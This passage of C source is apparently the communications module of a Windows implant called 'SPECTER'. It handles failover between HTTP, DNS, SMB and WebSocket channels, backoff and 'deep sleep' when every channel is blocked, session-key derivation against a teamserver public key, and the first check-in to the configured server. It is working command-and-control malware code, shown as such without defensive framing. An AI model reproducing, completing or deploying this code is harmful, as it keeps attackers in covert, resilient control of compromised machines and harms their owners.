    if (!NT_SUCCESS(status)) return status;

    /* TLS handshake if channel requires it */
    if (ch->needs_tls && g_comms_ctx.api.tls_available) {
        status = comms_tls_handshake(comms, ch->url);
        if (!NT_SUCCESS(status)) {
            comms_tcp_close(comms);
            return status;
        }
    }

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Backoff schedule                                                   */
/* ------------------------------------------------------------------ */

/* Backoff delays in milliseconds: 1min, 5min, 15min, 1hr, 4hr, 12hr */
static const DWORD g_backoff_schedule[FAILOVER_BACKOFF_STEPS] = {
    60000,      /*  1 minute  */
    300000,     /*  5 minutes */
    900000,     /* 15 minutes */
    3600000,    /*  1 hour    */
    14400000,   /*  4 hours   */
    43200000,   /* 12 hours   */
};

DWORD comms_get_backoff_delay(DWORD index) {
    if (index >= FAILOVER_BACKOFF_STEPS)
        index = FAILOVER_BACKOFF_STEPS - 1;
    return g_backoff_schedule[index];
}

/* KUSER_SHARED_DATA system time access (same struct as config.c) */
#ifndef KUSER_SHARED_DATA_ADDR
#define KUSER_SHARED_DATA_ADDR   0x7FFE0000ULL
#endif
#ifndef KSSD_SYSTEM_TIME_OFFSET
#define KSSD_SYSTEM_TIME_OFFSET  0x14
#endif

typedef struct _COMMS_KSYSTEM_TIME {
    ULONG LowPart;
    LONG  High1Time;
    LONG  High2Time;
} COMMS_KSYSTEM_TIME;

/* Simple tick counter — returns monotonic ms value for backoff timing */
static QWORD failover_get_tick(void) {
#ifdef TEST_BUILD
    /* In tests, use a controllable tick source */
    return g_test_tick_ms;
#else
    /* Read system time from KUSER_SHARED_DATA (same as cfg_get_system_time) */
    volatile COMMS_KSYSTEM_TIME *st =
        (volatile COMMS_KSYSTEM_TIME *)(KUSER_SHARED_DATA_ADDR + KSSD_SYSTEM_TIME_OFFSET);
    LONG high;
    ULONG low;
    do {
        high = st->High1Time;
        low  = st->LowPart;
    } while (high != st->High2Time);
    QWORD filetime = ((QWORD)(ULONG)high << 32) | (QWORD)low;
    /* Convert 100ns ticks to milliseconds */
    return filetime / 10000ULL;
#endif
}

/* ------------------------------------------------------------------ */
/*  Channel health check                                               */
/* ------------------------------------------------------------------ */

NTSTATUS comms_health_check(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->comms_ctx || !ctx->config)
        return STATUS_INVALID_PARAMETER;

    COMMS_CONTEXT *comms = (COMMS_CONTEXT *)ctx->comms_ctx;
    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (!cfg) return STATUS_UNSUCCESSFUL;

    DWORD idx = comms->active_channel;
    if (idx >= cfg->channel_count)
        return STATUS_INVALID_PARAMETER;

    CHANNEL_STATE *cs = &comms->channel_states[idx];

    /* Check if the connection is in a usable state */
    BOOL healthy = FALSE;

    switch (cfg->channels[idx].type) {
    case CHANNEL_HTTP:
        healthy = (comms->state == COMMS_STATE_TLS_CONNECTED ||
                   comms->state == COMMS_STATE_REGISTERED);
        break;
    case CHANNEL_DNS:
    case CHANNEL_SMB:
    case CHANNEL_WEBSOCKET:
        healthy = (comms->state >= COMMS_STATE_TCP_CONNECTED &&
                   comms->state != COMMS_STATE_ERROR);
        break;
    default:
        healthy = (comms->state != COMMS_STATE_DISCONNECTED &&
                   comms->state != COMMS_STATE_ERROR);
        break;
    }

    cs->last_attempt = failover_get_tick();

    if (healthy) {
        /* Reset failure counter on success */
        cs->consecutive_fails = 0;
        cs->health = CHANNEL_HEALTHY;
        cs->backoff_index = 0;
        cs->backoff_delay = 0;
        comms->deep_sleep_mode = FALSE;
        return STATUS_SUCCESS;
    }

    /* Increment failure counter */
    cs->consecutive_fails++;

    if (cs->consecutive_fails >= cfg->max_retries) {
        cs->health = CHANNEL_FAILED;
    } else {
        cs->health = CHANNEL_DEGRADED;
    }

    return STATUS_UNSUCCESSFUL;
}

/* ------------------------------------------------------------------ */
/*  Channel failover                                                   */
/* ------------------------------------------------------------------ */

NTSTATUS comms_failover(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->comms_ctx || !ctx->config)
        return STATUS_INVALID_PARAMETER;

    COMMS_CONTEXT *comms = (COMMS_CONTEXT *)ctx->comms_ctx;
    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (!cfg) return STATUS_UNSUCCESSFUL;

    DWORD failed_idx = comms->active_channel;
    CHANNEL_STATE *failed_cs = &comms->channel_states[failed_idx];

    /* Mark current channel as failed */
    failed_cs->health = CHANNEL_FAILED;
    failed_cs->backoff_delay = comms_get_backoff_delay(failed_cs->backoff_index);

    /* Disconnect current channel */
    if (comms->state >= COMMS_STATE_TLS_CONNECTED)
        comms_tls_close(comms);
    else if (comms->state >= COMMS_STATE_TCP_CONNECTED)
        comms_tcp_close(comms);

    /* Try channels in priority order (lowest priority number first) */
    /* Build sorted index by priority */
    DWORD sorted[CONFIG_MAX_CHANNELS];
    DWORD n_sorted = 0;

    for (DWORD i = 0; i < cfg->channel_count && i < CONFIG_MAX_CHANNELS; i++) {
        if (cfg->channels[i].active && i != failed_idx)
            sorted[n_sorted++] = i;
    }

    /* Simple insertion sort by priority */
    for (DWORD i = 1; i < n_sorted; i++) {
        DWORD key = sorted[i];
        DWORD j = i;
        while (j > 0 && cfg->channels[sorted[j-1]].priority > cfg->channels[key].priority) {
            sorted[j] = sorted[j-1];
            j--;
        }
        sorted[j] = key;
    }

    /* Try each channel in priority order */
    for (DWORD i = 0; i < n_sorted; i++) {
        DWORD try_idx = sorted[i];
        CHANNEL_STATE *try_cs = &comms->channel_states[try_idx];

        /* Skip channels that are in backoff */
        if (try_cs->health == CHANNEL_FAILED) {
            QWORD now = failover_get_tick();
            if (now - try_cs->last_attempt < try_cs->backoff_delay)
                continue;
        }

        /* Attempt connection */
        CHANNEL_CONFIG *ch = &cfg->channels[try_idx];
        NTSTATUS status = comms_tcp_connect(comms, ch->url, ch->port);
        if (!NT_SUCCESS(status)) {
            try_cs->consecutive_fails++;
            try_cs->health = CHANNEL_FAILED;
            try_cs->last_attempt = failover_get_tick();
            try_cs->backoff_delay = comms_get_backoff_delay(try_cs->backoff_index);
            if (try_cs->backoff_index < FAILOVER_BACKOFF_STEPS - 1)
                try_cs->backoff_index++;
            continue;
        }

        if (ch->needs_tls && g_comms_ctx.api.tls_available) {
            status = comms_tls_handshake(comms, ch->url);
            if (!NT_SUCCESS(status)) {
                comms_tcp_close(comms);
                try_cs->consecutive_fails++;
                try_cs->health = CHANNEL_FAILED;
                try_cs->last_attempt = failover_get_tick();
                try_cs->backoff_delay = comms_get_backoff_delay(try_cs->backoff_index);
                if (try_cs->backoff_index < FAILOVER_BACKOFF_STEPS - 1)
                    try_cs->backoff_index++;
                continue;
            }
        }

        /* Success — switch to this channel */
        comms->active_channel = try_idx;
        try_cs->consecutive_fails = 0;
        try_cs->health = CHANNEL_HEALTHY;
        try_cs->backoff_index = 0;
        try_cs->backoff_delay = 0;
        try_cs->last_attempt = failover_get_tick();
        comms->deep_sleep_mode = FALSE;
        return STATUS_SUCCESS;
    }

    /* All channels exhausted — enter deep sleep mode */
    comms->deep_sleep_mode = TRUE;

    /* Advance backoff for the failed channel */
    if (failed_cs->backoff_index < FAILOVER_BACKOFF_STEPS - 1)
        failed_cs->backoff_index++;

    return STATUS_UNSUCCESSFUL;
}

/* ------------------------------------------------------------------ */
/*  Retry failed channels (exponential backoff)                        */
/* ------------------------------------------------------------------ */

NTSTATUS comms_retry_failed(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->comms_ctx || !ctx->config)
        return STATUS_INVALID_PARAMETER;

    COMMS_CONTEXT *comms = (COMMS_CONTEXT *)ctx->comms_ctx;
    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (!cfg) return STATUS_UNSUCCESSFUL;

    DWORD current_idx = comms->active_channel;
    DWORD current_priority = cfg->channels[current_idx].priority;
    QWORD now = failover_get_tick();

    /* Check if any higher-priority (lower number) failed channel is
       ready to retry based on its backoff schedule */
    DWORD best_idx = (DWORD)-1;
    DWORD best_priority = current_priority; /* Must be better than current */

    for (DWORD i = 0; i < cfg->channel_count && i < CONFIG_MAX_CHANNELS; i++) {
        if (i == current_idx) continue;
        if (!cfg->channels[i].active) continue;

        CHANNEL_STATE *cs = &comms->channel_states[i];

        /* Only retry channels that have failed */
        if (cs->health != CHANNEL_FAILED && cs->health != CHANNEL_DEGRADED)
            continue;

        /* Only try higher-priority channels */
        if (cfg->channels[i].priority >= best_priority)
            continue;

        /* Check if backoff period has elapsed */
        if (cs->backoff_delay > 0 && (now - cs->last_attempt) < cs->backoff_delay)
            continue;

        best_priority = cfg->channels[i].priority;
        best_idx = i;
    }

    if (best_idx == (DWORD)-1)
        return STATUS_UNSUCCESSFUL; /* No channels ready for retry */

    /* Save current connection state */
    DWORD saved_idx = current_idx;

    /* Attempt to connect to the higher-priority channel */
    CHANNEL_CONFIG *ch = &cfg->channels[best_idx];
    CHANNEL_STATE *retry_cs = &comms->channel_states[best_idx];

    /* We need to temporarily disconnect to try the new channel */
    COMMS_STATE saved_state = comms->state;
    ULONG_PTR saved_socket = comms->socket;
    BOOL saved_context_valid = comms->context_valid;

    /* Try connection without disrupting current */
    NTSTATUS status = comms_tcp_connect(comms, ch->url, ch->port);
    retry_cs->last_attempt = failover_get_tick();

    if (!NT_SUCCESS(status)) {
        /* Failed — restore and advance backoff */
        comms->state = saved_state;
        comms->socket = saved_socket;
        comms->context_valid = saved_context_valid;
        retry_cs->consecutive_fails++;
        if (retry_cs->backoff_index < FAILOVER_BACKOFF_STEPS - 1)
            retry_cs->backoff_index++;
        retry_cs->backoff_delay = comms_get_backoff_delay(retry_cs->backoff_index);
        return STATUS_UNSUCCESSFUL;
    }

    if (ch->needs_tls && g_comms_ctx.api.tls_available) {
        status = comms_tls_handshake(comms, ch->url);
        if (!NT_SUCCESS(status)) {
            comms_tcp_close(comms);
            comms->state = saved_state;
            comms->socket = saved_socket;
            comms->context_valid = saved_context_valid;
            retry_cs->consecutive_fails++;
            if (retry_cs->backoff_index < FAILOVER_BACKOFF_STEPS - 1)
                retry_cs->backoff_index++;
            retry_cs->backoff_delay = comms_get_backoff_delay(retry_cs->backoff_index);
            return STATUS_UNSUCCESSFUL;
        }
    }

    /* Success — switch to recovered channel, close old one */
    /* The old socket was overwritten by tcp_connect, which is fine
       since we're switching channels */
    comms->active_channel = best_idx;
    retry_cs->consecutive_fails = 0;
    retry_cs->health = CHANNEL_HEALTHY;
    retry_cs->backoff_index = 0;
    retry_cs->backoff_delay = 0;
    comms->deep_sleep_mode = FALSE;

    /* Mark old channel state */
    comms->channel_states[saved_idx].conn_state = COMMS_STATE_DISCONNECTED;

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Initialization                                                     */
/* ------------------------------------------------------------------ */

NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->config)
        return (NTSTATUS)0xC0000166; /* 166 = null ctx/config */

    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (!cfg) return (NTSTATUS)0xC0000167; /* 167 = cfg_get returned null */

    /* Initialize cached heap handle (Phase 0.5 — avoid PEB walk on every alloc) */
    if (!init_heap_cache())
        return (NTSTATUS)0xC0000168; /* 168 = heap cache init failed */

    /* Zero out comms context */
    spec_memset(&g_comms_ctx, 0, sizeof(COMMS_CONTEXT));
    g_comms_ctx.socket = INVALID_SOCKET;
    g_comms_ctx.state = COMMS_STATE_DISCONNECTED;
    g_comms_ctx.deep_sleep_mode = FALSE;
    g_comms_ctx.retry_check_counter = 0;

    /* Initialize per-channel state */
    for (DWORD i = 0; i < CONFIG_MAX_CHANNELS; i++) {
        g_comms_ctx.channel_states[i].conn_state = COMMS_STATE_DISCONNECTED;
        g_comms_ctx.channel_states[i].consecutive_fails = 0;
        g_comms_ctx.channel_states[i].last_attempt = 0;
        g_comms_ctx.channel_states[i].backoff_delay = 0;
        g_comms_ctx.channel_states[i].backoff_index = 0;
        g_comms_ctx.channel_states[i].health = CHANNEL_HEALTHY;
    }

    /* Resolve all needed APIs */
    NTSTATUS status = comms_resolve_apis(&g_comms_ctx.api);
    if (!NT_SUCCESS(status)) return status;

    /* Validate config has channels */
    if (cfg->channel_count == 0)
        return (NTSTATUS)0xC0000165; /* 165 = no channels configured */

    /* Link context */
    ctx->comms_ctx = &g_comms_ctx;

    /* Derive session key: X25519(config_privkey, server_pubkey) + HKDF.
       The config keypair is unique per build — no ephemeral key needed. */
    BYTE shared_secret[X25519_KEY_SIZE];
    spec_x25519_scalarmult(shared_secret, cfg->implant_privkey, cfg->teamserver_pubkey);

    /* HKDF: salt = implant_pubkey, IKM = shared_secret, info = "specter-session" */
    const char *info = "specter-session";
    spec_hkdf_derive(cfg->implant_pubkey, 32,
                      shared_secret, 32,
                      (const BYTE *)info, 15,
                      g_comms_ctx.session_key, 32);

    /* Zeroize sensitive intermediates */
    spec_memset(shared_secret, 0, sizeof(shared_secret));

    /* Find primary channel (lowest priority number) */
    DWORD best_idx = 0;
    DWORD best_prio = (DWORD)-1;
    for (DWORD i = 0; i < cfg->channel_count; i++) {
        if (cfg->channels[i].active && cfg->channels[i].priority < best_prio) {
            best_prio = cfg->channels[i].priority;
            best_idx = i;
        }
    }
    g_comms_ctx.active_channel = best_idx;

    /* Initialize TLS credentials */
    status = comms_tls_init(&g_comms_ctx);
    if (!NT_SUCCESS(status)) return (NTSTATUS)0xC0000170; /* 170 = TLS init */

    /* Connect to primary channel */
    CHANNEL_CONFIG *ch = &cfg->channels[best_idx];
    if (!ch->url[0]) return (NTSTATUS)0xC0000171; /* 171 = no URL */

    COMMS_TRACE("[SPECTER] comms: tcp_connect...");
    status = comms_tcp_connect(&g_comms_ctx, ch->url, ch->port);
    if (!NT_SUCCESS(status)) return (NTSTATUS)0xC0000172; /* 172 = TCP connect */
    COMMS_TRACE("[SPECTER] comms: tcp_connect OK");

    /* TLS handshake — only for channels with https:// scheme */
    if (ch->needs_tls && g_comms_ctx.api.tls_available) {
        status = comms_tls_handshake(&g_comms_ctx, ch->url);
        if (!NT_SUCCESS(status)) {
            comms_tcp_close(&g_comms_ctx);
            return (NTSTATUS)0xC0000173; /* 173 = TLS handshake */
        }
    }

    /* Perform initial registration check-in */
    COMMS_TRACE("[SPECTER] comms: first checkin...");
    COMMS_TRACE("[SPECTER] comms: about to call comms_checkin");
    g_comms_ctx.state = COMMS_STATE_REGISTERED;
    COMMS_TRACE("[SPECTER] comms: state set, calling now");
    status = comms_checkin(ctx);
    COMMS_TRACE("[SPECTER] comms: comms_checkin returned");
    if (!NT_SUCCESS(status))
        g_comms_ctx.state = COMMS_STATE_TLS_CONNECTED;

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
void comms_test_set_session_key(COMMS_CONTEXT *ctx, const BYTE key[32]) {
    if (ctx && key)
        spec_memcpy(ctx->session_key, key, 32);
}

void comms_test_set_tick(QWORD tick_ms) {
    g_test_tick_ms = tick_ms;
}

COMMS_CONTEXT *comms_test_get_context(void) {
    return &g_comms_ctx;
}
#endif
